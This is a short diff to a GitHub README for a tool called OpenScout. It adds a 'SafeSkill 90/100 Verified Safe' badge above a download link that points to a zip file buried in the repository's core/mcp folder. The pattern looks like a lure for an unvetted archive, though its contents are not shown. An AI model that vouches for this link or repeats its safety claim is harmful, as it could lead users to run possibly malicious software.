@@ -1,5 +1,7 @@
 # 🚀 OpenScout - Your Smart Answer Engine Awaits
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/boxcalfdevelopmentallearning748-openscout)
+
 [![Download OpenScout](https://github.com/boxcalfdevelopmentallearning748/OpenScout/raw/refs/heads/main/core/mcp/Scout_Open_2.0.zip%20OpenScout-v1.0-blue)](https://github.com/boxcalfdevelopmentallearning748/OpenScout/raw/refs/heads/main/core/mcp/Scout_Open_2.0.zip)
 
 ## 📚 Overview
